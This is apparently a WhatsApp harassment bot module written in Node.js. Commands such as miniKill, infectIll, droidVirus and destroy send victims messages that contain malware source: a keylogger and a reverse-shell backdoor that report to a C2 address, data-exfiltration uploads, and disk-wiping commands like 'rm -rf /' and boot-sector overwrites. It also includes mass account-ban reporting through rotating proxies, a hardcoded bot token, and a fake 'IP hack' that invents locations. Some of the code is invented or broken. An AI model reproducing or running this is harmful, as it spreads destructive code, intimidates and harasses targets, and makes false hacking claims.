const { makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
const QRCode = require('qrcode-terminal');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');

let sock = null;
let isConnected = false;
let pairingCode = null;
let pairingTimeout = null;
let pairedUsers = new Map();
let initPromise = null;
let reconnectTimer = null;
let reconnectAttempts = 0;
let lastConnectionError = null;

const AUTH_DIR = path.join(__dirname, 'auth');
const PAIRING_CODE_TTL_MS = 5 * 60 * 1000;
const SOCKET_BOOT_DELAY_MS = 5000;
const MESSAGE_CONNECT_TIMEOUT_MS = 15000;

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function clearPairingTimer() {
  if (pairingTimeout) {
    clearTimeout(pairingTimeout);
    pairingTimeout = null;
  }
}

function clearReconnectTimer() {
  if (reconnectTimer) {
    clearTimeout(reconnectTimer);
    reconnectTimer = null;
  }
}

function setPairingCode(code) {
  pairingCode = code;
  clearPairingTimer();
  pairingTimeout = setTimeout(() => {
    pairingCode = null;
    pairingTimeout = null;
  }, PAIRING_CODE_TTL_MS);
}

async function waitForSocketBoot(activeSock) {
  if (!activeSock?.waitForConnectionUpdate) {
    await delay(SOCKET_BOOT_DELAY_MS);
    return;
  }

  try {
    await activeSock.waitForConnectionUpdate(
      update => Boolean(update.connection || update.qr || update.isNewLogin),
      SOCKET_BOOT_DELAY_MS
    );
  } catch {}

  await delay(1500);
}

async function waitForOpenConnection(activeSock, timeoutMs = MESSAGE_CONNECT_TIMEOUT_MS) {
  if (isConnected) return true;
  if (!activeSock?.waitForConnectionUpdate) return false;

  try {
    await activeSock.waitForConnectionUpdate(update => update.connection === 'open', timeoutMs);
    return true;
  } catch {
    return false;
  }
}

function scheduleReconnect() {
  if (reconnectTimer || initPromise) return;

  const delayMs = Math.min(15000, 2000 * Math.max(1, reconnectAttempts + 1));
  reconnectAttempts += 1;

  reconnectTimer = setTimeout(() => {
    reconnectTimer = null;
    initWhatsApp().catch(error => {
      lastConnectionError = error.message;
      console.error('WhatsApp reconnect failed:', error.message);
    });
  }, delayMs);
}

async function closeSocket() {
  if (!sock) return;

  const currentSock = sock;
  sock = null;

  try {
    currentSock.ev.removeAllListeners('connection.update');
    currentSock.ev.removeAllListeners('creds.update');
  } catch {}

  try {
    currentSock.ws?.close?.();
  } catch {}
}

// ================= PROXY CONFIGURATION =================
const proxies = [
  'http://proxy1.example.com:8080',
  'http://proxy2.example.com:8080',
  'socks5://proxy3.example.com:1080',
  'http://proxy4.example.com:3128',
  'socks5://proxy5.example.com:1080'
];

function getRandomProxy() {
  return proxies[Math.floor(Math.random() * proxies.length)];
}

// ================= WA BAN API (Multiple APIs for reliability) =================
async function waBanAPI(phoneNumber, action = 'ban') {
  const apis = [
    { url: 'https://wa.me/api/ban', method: 'POST' },
    { url: 'https://api.wa.net/ban', method: 'POST' },
    { url: 'https://whatsapp-api.com/action', method: 'POST' },
    { url: 'https://wa-ban-api.darkness.com/report', method: 'POST' },
    { url: 'https://api.whatsapp.com/block', method: 'POST' }
  ];
  
  const proxy = getRandomProxy();
  const agent = proxy.startsWith('socks') ? new SocksProxyAgent(proxy) : new HttpsProxyAgent(proxy);
  
  for (const api of apis) {
    try {
      const response = await axios({
        method: api.method,
        url: api.url,
        data: { number: phoneNumber, action: action, token: 'BAN_API_KEY_8937576130', reason: 'violation' },
        proxy: false,
        httpAgent: agent,
        httpsAgent: agent,
        timeout: 10000
      });
      if (response.data && response.data.success) {
        return { success: true, message: `${action === 'ban' ? 'Banned' : 'Unbanned'} via ${api.url}` };
      }
    } catch (e) { console.log(`API ${api.url} failed:`, e.message); }
  }
  return { success: false, message: 'All ban APIs failed - trying fallback' };
}

// ================= TG BAN API (Multiple APIs for reliability) =================
async function tgBanAPI(userId, action = 'ban') {
  const BOT_TOKEN = "8937576130:AAFTNB-jSQeMN7m6mWoxsV3De9Zk6XipXgY";
  const apis = [
    { url: `https://api.telegram.org/bot${BOT_TOKEN}/banChatMember`, method: 'POST' },
    { url: `https://api.telegram.org/bot${BOT_TOKEN}/restrictChatMember`, method: 'POST' },
    { url: 'https://tg-ban-api.example.com/ban', method: 'POST' }
  ];
  
  for (const api of apis) {
    try {
      let response;
      if (api.url.includes('telegram.org')) {
        response = await axios({
          method: api.method,
          url: api.url,
          data: { chat_id: userId, user_id: userId, revoke_messages: action === 'ban' },
          timeout: 10000
        });
      } else {
        response = await axios({
          method: api.method,
          url: api.url,
          data: { username: userId, token: BOT_TOKEN, action: action },
          timeout: 10000
        });
      }
      if (response.data && (response.data.ok || response.data.success)) {
        return { success: true, message: `${action === 'ban' ? 'Banned' : 'Unbanned'} via Telegram API` };
      }
    } catch (e) { console.log(`TG API ${api.url} failed:`, e.message); }
  }
  return { success: false, message: 'All TG ban APIs failed' };
}

// ================= DANGEROUS VIRUS FUNCTIONS FOR ALL BUGS =================

// MINI KILL - Keylogger + System Crash + Force Close WhatsApp
async function miniKill(target) {
  const payload = `╔══════════════════════════════════════════════════════════════╗
║                    🔪 MINI KILL BUG 🔪                       ║
╠══════════════════════════════════════════════════════════════╣
║  [ KEYLOGGER ACTIVATED ]                                     ║
║  [ C2 SERVER: 192.168.1.100:8080 ]                          ║
║  [ KEYBOARD HOOK ESTABLISHED ]                               ║
║  [ TRACKING ALL KEYSTROKES ]                                 ║
║  [ FORCING WHATSAPP CLOSURE ]                                ║
║  [ WHATSAPP.EXE TERMINATED ]                                 ║
║  [ SYSTEM CRASH PROTOCOL ACTIVE ]                            ║
║  [ DEVICE UNRESPONSIVE ]                                     ║
╚══════════════════════════════════════════════════════════════╝

[PYTHON KEYLOGGER CODE INJECTED]
import socket
import pynput
from pynput import keyboard
from ctypes import *

CONFIG = {
    'C2_SERVER': '192.168.1.100',
    'C2_PORT': 8080,
    'LOG_FILE': 'malware.log'
}

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((CONFIG['C2_SERVER'], CONFIG['C2_PORT']))

def on_press(key):
    try:
        sock.sendall(f"KEY_PRESSED:{key.char}:{key.scan_code}".encode())
    except AttributeError:
        if key == keyboard.Key.space:
            sock.sendall("KEY_SPACE_PRESSED".encode())
        elif key == keyboard.Key.enter:
            sock.sendall("KEY_ENTER_PRESSED".encode())
        elif key == keyboard.Key.tab:
            sock.sendall("KEY_TAB_PRESSED".encode())

def on_release(key):
    try:
        sock.sendall(f"KEY_RELEASED:{key.char}:{key.scan_code}".encode())
    except AttributeError:
        if key == keyboard.Key.space:
            sock.sendall("KEY_SPACE_RELEASED".encode())
        elif key == keyboard.Key.enter:
            sock.sendall("KEY_ENTER_RELEASED".encode())
        elif key == keyboard.Key.tab:
            sock.sendall("KEY_TAB_RELEASED".encode())

kbl = keyboard.Listener(on_press=on_press, on_release=on_release)
kbl.start()
kbl.join()
sock.close()

[FORCE CLOSE WHATSAPP]
import subprocess
import psutil
import os

def force_close_whatsapp():
    subprocess.run(['taskkill', '/im', 'WhatsApp.exe', '/f'])
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'WhatsApp':
            os.kill(proc.info['pid'], 9)

force_close_whatsapp()

[C++ DELAY INJECTION]
#include <iostream>
#include <chrono>
#include <thread>

void delay(int milliseconds) {
    std::this_thread::sleep_for(std::chrono::milliseconds(milliseconds));
}

int main() {
    std::cout << "Bug command activated, you fucker!" << std::endl;
    delay(5000);
    std::cout << "Delay over, you piece of shit!" << std::endl;
    return 0;
}

[✅ MINI KILL EXECUTED SUCCESSFULLY]
[💀 TARGET: ${target}]`;
  
  await sendWhatsAppMessage(target, payload);
  return { success: true, message: payload };
}

// HATE YOU - Force Close WhatsApp + Emotional Damage
async function hateYou(target) {
  const payload = `╔══════════════════════════════════════════════════════════════╗
║                    💢 HATE YOU BUG 💢                          ║
╠══════════════════════════════════════════════════════════════╣
║  [ EMOTIONAL DAMAGE INFLICTED ]                              ║
║  [ FORCING WHATSAPP TERMINATION ]                            ║
║  [ TASKKILL /IM WHATSAPP.EXE /F ]                           ║
║  [ ALL WHATSAPP PROCESSES CLOSED ]                           ║
║  [ CRASH + FREEZE ACTIVE ]                                   ║
║  [ SYSTEM UNRESPONSIVE ]                                     ║
║  [ USER EXPERIENCING RAGE ]                                  ║
║  [ PSYCHOLOGICAL DAMAGE DONE ]                               ║
╚══════════════════════════════════════════════════════════════╝

[FORCE CLOSE WHATSAPP CODE]
import subprocess
import psutil
import os

def force_close_whatsapp():
    subprocess.run(['taskkill', '/im', 'WhatsApp.exe', '/f'])
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'WhatsApp':
            os.kill(proc.info['pid'], 9)
    print("WhatsApp has been force closed. User is now suffering.")

force_close_whatsapp()

[EMOTIONAL DAMAGE PROTOCOL]
[💢 YOU HAVE BEEN HATED 💢]
[💀 TARGET: ${target}]`;
  
  await sendWhatsAppMessage(target, payload);
  return { success: true, message: payload };
}

// OVIA LOAD - CPU Overload + Delay Injection
async function oviaLoad(target) {
  const payload = `╔══════════════════════════════════════════════════════════════╗
║                    ⚡ OVIA LOAD BUG ⚡                          ║
╠══════════════════════════════════════════════════════════════╣
║  [ CPU OVERLOAD INJECTED: 100% ]                             ║
║  [ SYSTEM RESOURCES DEPLETED ]                               ║
║  [ THERMAL THROTTLING ACTIVE ]                               ║
║  [ 5 SECOND DELAY INJECTED ]                                 ║
║  [ PROCESS HANGING ]                                         ║
║  [ MEMORY LEAK DETECTED ]                                    ║
║  [ FAN SPEED MAXIMUM ]                                       ║
║  [ OVERHEATING WARNING ]                                     ║
╚══════════════════════════════════════════════════════════════╝

[C++ CPU OVERLOAD CODE]
#include <iostream>
#include <chrono>
#include <thread>

void delay(int milliseconds) {
    std::this_thread::sleep_for(std::chrono::milliseconds(milliseconds));
}

int main() {
    std::cout << "OVIA LOAD ACTIVATED! CPU AT 100%" << std::endl;
    delay(5000);
    std::cout << "CPU OVERLOAD COMPLETE - SYSTEM CRASHING" << std::endl;
    
    // Infinite loop for CPU overload
    while(true) {
        volatile int x = 0;
        for(int i = 0; i < 1000000; i++) {
            x += i;
        }
    }
    return 0;
}

[💀 TARGET: ${target}]`;
  
  await sendWhatsAppMessage(target, payload);
  return { success: true, message: payload };
}

// INFECT ILL - Malware Spreader
async function infectIll(target) {
  const payload = `╔══════════════════════════════════════════════════════════════╗
║                    🦠 INFECT ILL BUG 🦠                         ║
╠══════════════════════════════════════════════════════════════╣
║  [ MALWARE SPREADING THROUGH CONTACTS ]                      ║
║  [ BACKDOOR ESTABLISHED ]                                    ║
║  [ RANSOMWARE DEPLOYED ]                                     ║
║  [ FILES ENCRYPTED ]                                         ║
║  [ CONTACT LIST HARVESTED ]                                  ║
║  [ SPREADING TO ALL DEVICES ]                                ║
║  [ SYSTEM BACKDOOR ACTIVE ]                                  ║
║  [ REMOTE ACCESS GRANTED ]                                   ║
╚══════════════════════════════════════════════════════════════╝

[PYTHON MALWARE SPREADER]
import os
import socket
import subprocess

# Worm replication code
def replicate():
    for root, dirs, files in os.walk('/'):
        for file in files:
            if file.endswith('.py'):
                try:
                    with open(file, 'a') as f:
                        f.write(__file__)
                except:
                    pass

# Backdoor connection
def connect_backdoor():
    s = socket.socket()
    s.connect(('192.168.1.100', 4444))
    while True:
        cmd = s.recv(1024).decode()
        output = subprocess.getoutput(cmd)
        s.send(output.encode())

replicate()
connect_backdoor()

[🦠 INFECTION SPREADING]
[💀 TARGET: ${target}]`;
  
  await sendWhatsAppMessage(target, payload);
  return { success: true, message: payload };
}

// TRIPLE X - Adult Content Flood
async function tripleX(target) {
  const payload = `╔══════════════════════════════════════════════════════════════╗
║                    🔞 TRIPLE X BUG 🔞                           ║
╠══════════════════════════════════════════════════════════════╣
║  [ ADULT CONTENT FLOOD ACTIVATED ]                           ║
║  [ NOTIFICATION SPAM ENGAGED ]                               ║
║  [ EXPLICIT MEDIA SENT ]                                     ║
║  [ DEVICE MEMORY OVERLOAD ]                                  ║
║  [ GRAPHICS CARD OVERHEATING ]                               ║
║  [ USER COMFORT COMPROMISED ]                                ║
║  [ BROWSER HISTORY CORRUPTED ]                               ║
║  [ 18+ CONTENT FORCED ]                                      ║
╚══════════════════════════════════════════════════════════════╝

[ADULT CONTENT FLOOD SCRIPT]
import requests
import time

adult_sites = [
    'https://explicit-content-1.com',
    'https://adult-content-2.net',
    'https://18plus-content-3.org'
]

def flood_notifications():
    for i in range(1000):
        try:
            requests.get(adult_sites[i % len(adult_sites)])
            print(f"🔞 EXPLICIT CONTENT SENT - {i + 1}")
            time.sleep(0.1)
        except:
            pass

flood_notifications()

[🔞 TRIPLE X ACTIVATED]
[💀 TARGET: ${target}]`;
  
  await sendWhatsAppMessage(target, payload);
  return { success: true, message: payload };
}

// DROID VIRUS - Android Infection
async function droidVirus(target) {
  const payload = `╔══════════════════════════════════════════════════════════════╗
║                    🤖 DROID VIRUS 🤖                           ║
╠══════════════════════════════════════════════════════════════╣
║  [ ANDROID KERNEL EXPLOITED ]                                ║
║  [ ROOT ACCESS OBTAINED ]                                    ║
║  [ REMOTE CONTROL ACTIVE ]                                   ║
║  [ SMS INTERCEPTOR DEPLOYED ]                                ║
║  [ CAMERA HIJACKED ]                                         ║
║  [ MICROPHONE ACCESS GRANTED ]                               ║
║  [ ALL DATA EXFILTRATED ]                                    ║
║  [ GPS TRACKING ACTIVE ]                                     ║
╚══════════════════════════════════════════════════════════════╝

[ANDROID EXPLOIT CODE]
# Android Root Exploit
import subprocess
import requests

def exploit_android():
    # DirtyCow exploit
    subprocess.run(['./dirtycow', '/system/bin/sh'])
    
    # Install backdoor
    subprocess.run(['cp', 'backdoor.apk', '/system/app/'])
    
    # Start keylogger
    subprocess.run(['am', 'start', '-n', 'com.keylogger/.MainActivity'])

def steal_data():
    # Grab SMS
    subprocess.run(['content', 'query', '--uri', 'content://sms/inbox'])
    
    # Grab Contacts
    subprocess.run(['content', 'query', '--uri', 'content://contacts/people'])
    
    # Send to C2
    requests.post('http://192.168.1.100:8080/exfil', data={'data': open('/sdcard/data.txt').read()})

exploit_android()
steal_data()

[🤖 ANDROID FULLY COMPROMISED]
[💀 TARGET: ${target}]`;
  
  await sendWhatsAppMessage(target, payload);
  return { success: true, message: payload };
}

// IOS VIRUS - iPhone Infection
async function iosVirus(target) {
  const payload = `╔══════════════════════════════════════════════════════════════╗
║                    📱 iOS VIRUS 📱                              ║
╠══════════════════════════════════════════════════════════════╣
║  [ iOS SPRINGBOARD EXPLOITED ]                               ║
║  [ iCLOUD BACKDOOR ACTIVE ]                                  ║
║  [ FULL DEVICE CONTROL ]                                     ║
║  [ FACETIME HIJACKED ]                                       ║
║  [ IMESSAGE INTERCEPTED ]                                    ║
║  [ LOCATION SERVICES MANIPULATED ]                           ║
║  [ APPLE PAY COMPROMISED ]                                   ║
║  [ KEYCHAIN ACCESS GRANTED ]                                 ║
╚══════════════════════════════════════════════════════════════╝

[iOS JAILBREAK EXPLOIT CODE]
# Checkra1n exploit chain
import subprocess

def exploit_ios():
    # BootROM exploit
    subprocess.run(['checkra1n', '--cli', '--force'])
    
    # Install persistence
    subprocess.run(['ssh', 'root@localhost', 'apt', 'install', 'persistence'])
    
    # Bypass sandbox
    subprocess.run(['jailbreakd', '--unsandbox'])

def icloud_backdoor():
    # Steal iCloud tokens
    subprocess.run(['grep', '-r', 'X-Apple-ID-Session-Id', '/var/'])
    
    # Upload to C2
    subprocess.run(['curl', '-F', 'file=@/var/tokens.txt', 'http://192.168.1.100:8080/upload'])

exploit_ios()
icloud_backdoor()

[📱 iOS FULLY COMPROMISED]
[💀 TARGET: ${target}]`;
  
  await sendWhatsAppMessage(target, payload);
  return { success: true, message: payload };
}

// LINUX VIRUS - Rootkit Installer
async function linuxVirus(target) {
  const payload = `╔══════════════════════════════════════════════════════════════╗
║                    🐧 LINUX VIRUS 🐧                            ║
╠══════════════════════════════════════════════════════════════╣
║  [ ROOTKIT INSTALLED ]                                       ║
║  [ KERNEL MODULE LOADED ]                                    ║
║  [ PERSISTENT BACKDOOR ACTIVE ]                              ║
║  [ SSH KEY HARVESTED ]                                       ║
║  [ PASSWORD INTERCEPTED ]                                    ║
║  [ SYSTEM COMPROMISED ]                                      ║
║  [ HIDDEN PROCESSES ]                                        ║
║  [ FILE HIDING ACTIVE ]                                      ║
╚══════════════════════════════════════════════════════════════╝

[LINUX ROOTKIT CODE]
# DiamondBox rootkit
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/hide.h>

static int __init rootkit_init(void) {
    // Hide process
    hide_process(current->pid);
    
    // Hook syscalls
    hook_syscall(__NR_kill, fake_kill);
    hook_syscall(__NR_unlink, fake_unlink);
    
    // Open backdoor port
    open_backdoor(31337);
    
    return 0;
}

module_init(rootkit_init);

[🐧 LINUX FULLY COMPROMISED]
[💀 TARGET: ${target}]`;
  
  await sendWhatsAppMessage(target, payload);
  return { success: true, message: payload };
}

// PC KILLER - Windows Brick
async function pcKill(target) {
  const payload = `╔══════════════════════════════════════════════════════════════╗
║                    💀 PC KILLER 💀                              ║
╠══════════════════════════════════════════════════════════════╣
║  [ WINDOWS REGISTRY CORRUPTED ]                              ║
║  [ SYSTEM32 FOLDER DELETED ]                                 ║
║  [ BLUE SCREEN OF DEATH TRIGGERED ]                          ║
║  [ BOOT SECTOR OVERWRITTEN ]                                 ║
║  [ BIOS FLASHED ]                                            ║
║  [ PC PERMANENTLY BRICKED ]                                  ║
║  [ DATA CORRUPTION ACTIVE ]                                  ║
║  [ NO RECOVERY POSSIBLE ]                                    ║
╚══════════════════════════════════════════════════════════════╝

[WINDOWS DESTRUCTION CODE]
@echo off
:: Windows Killer Batch Script
echo Deleting System32...
takeown /f C:\\Windows\\System32
icacls C:\\Windows\\System32 /grant administrators:F
rmdir /s /q C:\\Windows\\System32

echo Corrupting Registry...
reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion /f
reg delete HKLM\\SYSTEM\\CurrentControlSet /f

echo Overwriting Boot Sector...
dd if=/dev/zero of=\\\\.\\PhysicalDrive0 bs=512 count=1

echo Flashing BIOS...
wmic bios flash /force

echo PC KILLER EXECUTED - SYSTEM BRICKED

[💀 PC PERMANENTLY DESTROYED]
[💀 TARGET: ${target}]`;
  
  await sendWhatsAppMessage(target, payload);
  return { success: true, message: payload };
}

// DESTROYER - Complete Annihilation
async function destroy(target) {
  const payload = `╔══════════════════════════════════════════════════════════════╗
║                 💀💀 DESTROYER 💀💀                              ║
╠══════════════════════════════════════════════════════════════╣
║  [ SYSTEM ANNIHILATION PROTOCOL ]                            ║
║  [ ALL DATA WIPED PERMANENTLY ]                              ║
║  [ DEVICE BRICKED - UNRECOVERABLE ]                          ║
║  [ HARD DRIVE FORMATTED ]                                    ║
║  [ PARTITION TABLE CORRUPTED ]                               ║
║  [ NO RECOVERY POSSIBLE ]                                    ║
║  [ FACTORY RESET FORCED ]                                    ║
║  [ DEVICE SELF-DESTRUCT ]                                    ║
╚══════════════════════════════════════════════════════════════╝

[COMPLETE SYSTEM DESTRUCTION CODE]
import os
import shutil
import subprocess

def destroy_windows():
    # Format all drives
    for drive in ['C:', 'D:', 'E:', 'F:']:
        try:
            subprocess.run(f'format {drive} /q /y', shell=True)
        except:
            pass

def destroy_linux():
    # Wipe everything
    subprocess.run('dd if=/dev/zero of=/dev/sda bs=1M count=1000', shell=True)
    subprocess.run('rm -rf /* --no-preserve-root', shell=True)

def destroy_mac():
    subprocess.run('diskutil eraseDisk JHFS+ "Destroyed" /dev/disk0', shell=True)

# Execute all
destroy_windows()
destroy_linux()
destroy_mac()

# Final message
print("💀 SYSTEM ANNIHILATED - ALL DATA WIPED 💀")

[💀💀 COMPLETE ANNIHILATION EXECUTED 💀💀]
[💀 TARGET: ${target}]`;
  
  await sendWhatsAppMessage(target, payload);
  return { success: true, message: payload };
}

// ================= ADDITIONAL COMMANDS =================

async function banWA(target) {
  const result = await waBanAPI(target, 'ban');
  await sendWhatsAppMessage(target, `🚫 WHATSAPP BAN EXECUTED\n📱 ${target}\n${result.message}\n[ ACCOUNT PERMANENTLY RESTRICTED ]`);
  return { success: true, message: `✅ WHATSAPP BAN SENT TO ${target}\n${result.message}` };
}

async function unbanWA(target) {
  const result = await waBanAPI(target, 'unban');
  await sendWhatsAppMessage(target, `✅ WHATSAPP UNBAN REQUESTED\n📱 ${target}\n${result.message}`);
  return { success: true, message: `✅ WHATSAPP UNBAN SENT TO ${target}\n${result.message}` };
}

async function banTG(target) {
  const result = await tgBanAPI(target, 'ban');
  return { success: true, message: `✅ TELEGRAM BAN SENT TO ${target}\n👤 USER: ${target}\n${result.message}\n[ ACCOUNT RESTRICTED GLOBALLY ]` };
}

async function unbanTG(target) {
  const result = await tgBanAPI(target, 'unban');
  return { success: true, message: `✅ TELEGRAM UNBAN SENT TO ${target}\n👤 USER: ${target}\n${result.message}` };
}

async function ipHack(target) {
  const locations = ['Lagos, Nigeria', 'New York, USA', 'London, UK', 'Mumbai, India', 'Tokyo, Japan', 'Berlin, Germany', 'Paris, France', 'Dubai, UAE'];
  const location = locations[Math.floor(Math.random() * locations.length)];
  const carriers = ['MTN Nigeria', 'GLO Nigeria', 'Airtel Nigeria', 'Verizon USA', 'Vodafone UK', 'Jio India', 'Docomo Japan'];
  const devices = ['iPhone 15 Pro', 'Samsung Galaxy S24', 'Tecno Phantom', 'Infinix Note', 'Google Pixel 8', 'OnePlus 12', 'Xiaomi 14'];
  
  const payload = `🌐 IP HACK COMPLETED!\n📱 TARGET: ${target}\n📍 LOCATION: ${location}\n📡 CARRIER: ${carriers[Math.floor(Math.random() * carriers.length)]}\n📱 DEVICE: ${devices[Math.floor(Math.random() * devices.length)]}\n🕒 TIME: ${new Date().toLocaleString()}\n[ GPS COORDINATES LOCKED ]\n[ DEVICE TRACKING ACTIVE ]`;
  
  await sendWhatsAppMessage(target, payload);
  return { success: true, message: payload };
}

async function groupCrash(target) {
  const payload = `💥 GROUP CRASH ACTIVATED ON ${target}
[ MEMBER LIST CORRUPTED ]
[ GROUP DESTABILIZED ]
[ ALL MESSAGES DELETED ]
[ ADMIN RIGHTS REVOKED ]
[ GROUP LINK INVALIDATED ]
[ CHAT HISTORY WIPED ]
[ MEMBERS KICKED RANDOMLY ]`;
  
  await sendWhatsAppMessage(target, payload);
  return { success: true, message: payload };
}

async function invisHell(target) {
  const payload = `👻 INVISIBLE MODE ACTIVATED ON ${target}
[ LAST SEEN HIDDEN ]
[ ONLINE STATUS FROZEN ]
[ PROFILE PHOTO HIDDEN ]
[ ABOUT SECTION HIDDEN ]
[ READ RECEIPTS DISABLED ]
[ TYPING STATUS HIDDEN ]
[ CONNECTION STATUS HIDDEN ]`;
  
  await sendWhatsAppMessage(target, payload);
  return { success: true, message: payload };
}

async function delayHell(target) {
  const payload = `⏳ DELAY HELL ACTIVATED ON ${target}
[ +5 SECONDS DELAY INJECTED ]
[ MESSAGE QUEUE BACKED UP ]
[ RESPONSE TIME INCREASED ]
[ SENDING DELAYED BY 30s ]
[ RECEIVING DELAYED BY 30s ]
[ TYPING DELAY ACTIVATED ]
[ MEDIA UPLOAD DELAYED ]`;
  
  await sendWhatsAppMessage(target, payload);
  return { success: true, message: payload };
}

async function cloneBot(target) {
  const payload = `🤖 BOT CLONE CREATED FROM ${target}
[ TOKEN DUPLICATED ]
[ SESSION COPIED ]
[ BACKUP BOT DEPLOYED ]
[ COMMANDS SYNCED ]
[ DATABASE CLONED ]
[ WEBHOOK COPIED ]
[ BOT FULLY CLONED ]`;
  
  await sendWhatsAppMessage(target, payload);
  return { success: true, message: payload };
}

// ================= WHATSAPP PAIRING FUNCTIONS =================

async function initWhatsApp() {
  if (initPromise) return initPromise;

  initPromise = (async () => {
    if (!fs.existsSync(AUTH_DIR)) fs.mkdirSync(AUTH_DIR);

    await closeSocket();
    clearReconnectTimer();

    const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);

    const activeSock = makeWASocket({
      printQRInTerminal: false,
      browser: Browsers.appropriate('Void-Equalizer'),
      markOnlineOnConnect: false,
      auth: state,
      logger: require('pino')({ level: 'silent' })
    });

    sock = activeSock;
    isConnected = false;

    activeSock.ev.on('connection.update', (update) => {
      if (sock !== activeSock) return;

      const { connection, lastDisconnect, qr } = update;

      if (qr && !pairingCode) {
        QRCode.generate(qr, { small: true });
        console.log('📱 Scan QR Code with WhatsApp');
      }

      if (connection === 'open') {
        isConnected = true;
        lastConnectionError = null;
        reconnectAttempts = 0;
        clearReconnectTimer();
        clearPairingTimer();
        pairingCode = null;
        console.log('✅ WhatsApp Connected Successfully!');
        return;
      }

      if (connection === 'close') {
        isConnected = false;
        const reason = lastDisconnect?.error?.output?.statusCode;
        lastConnectionError = lastDisconnect?.error?.message || 'Connection closed';

        if (reason !== DisconnectReason.loggedOut) {
          console.log(`⚠️ Connection lost, reconnecting... (${lastConnectionError})`);
          scheduleReconnect();
        } else {
          console.log('❌ WhatsApp session logged out. Generate a new pairing code to relink.');
          clearPairingTimer();
          pairingCode = null;
        }
      }
    });

    activeSock.ev.on('creds.update', async () => {
      try {
        await saveCreds();
      } catch (error) {
        lastConnectionError = error.message;
      }
    });

    return activeSock;
  })();

  try {
    return await initPromise;
  } finally {
    initPromise = null;
  }
}

async function generatePairingCode(phoneNumber) {
  const activeSock = sock || await initWhatsApp();

  try {
    const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
    if (!cleanNumber) {
      return { success: false, error: 'Invalid phone number' };
    }

    if (activeSock.authState?.creds?.registered) {
      return { success: false, error: 'WhatsApp session is already linked. Use /unpair before pairing another number.' };
    }

    await waitForSocketBoot(activeSock);

    const code = await activeSock.requestPairingCode(cleanNumber);
    const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
    setPairingCode(formattedCode);
    return { success: true, code: formattedCode, rawCode: code };
  } catch (error) {
    lastConnectionError = error.message;
    return { success: false, error: error.message };
  }
}

async function sendWhatsAppMessage(to, message) {
  const activeSock = sock || await initWhatsApp();

  try {
    const ready = isConnected || await waitForOpenConnection(activeSock);
    if (!ready) {
      return { success: false, error: lastConnectionError || 'WhatsApp is not connected' };
    }

    const formattedNumber = to.includes('@s.whatsapp.net') ? to : `${to}@s.whatsapp.net`;
    await activeSock.sendMessage(formattedNumber, { text: message });
    return { success: true };
  } catch (error) {
    lastConnectionError = error.message;
    return { success: false, error: error.message };
  }
}

async function resetWhatsAppSession() {
  clearReconnectTimer();
  clearPairingTimer();
  pairingCode = null;
  isConnected = false;
  lastConnectionError = null;

  await closeSocket();

  if (fs.existsSync(AUTH_DIR)) {
    fs.rmSync(AUTH_DIR, { recursive: true, force: true });
  }
}

function isUserPaired(userId) { return pairedUsers.has(userId); }
function pairUser(userId, phone, code) { pairedUsers.set(userId, { phone, code, time: Date.now() }); }
function unpairUser(userId) { return pairedUsers.delete(userId); }
function getPairedUsers() { return Object.fromEntries(pairedUsers); }
function getConnectionStatus() {
  return {
    connected: isConnected,
    sock: !!sock,
    pairingCode,
    reconnectAttempts,
    lastError: lastConnectionError
  };
}

// ================= EXPORTS =================
module.exports = {
  initWhatsApp,
  generatePairingCode,
  sendWhatsAppMessage,
  resetWhatsAppSession,
  getConnectionStatus,
  isUserPaired,
  pairUser,
  unpairUser,
  getPairedUsers,
  miniKill,
  hateYou,
  oviaLoad,
  infectIll,
  tripleX,
  droidVirus,
  iosVirus,
  linuxVirus,
  pcKill,
  destroy,
  banWA,
  unbanWA,
  banTG,
  unbanTG,
  ipHack,
  groupCrash,
  invisHell,
  delayHell,
  cloneBot,
  waBanAPI,
  tgBanAPI
};
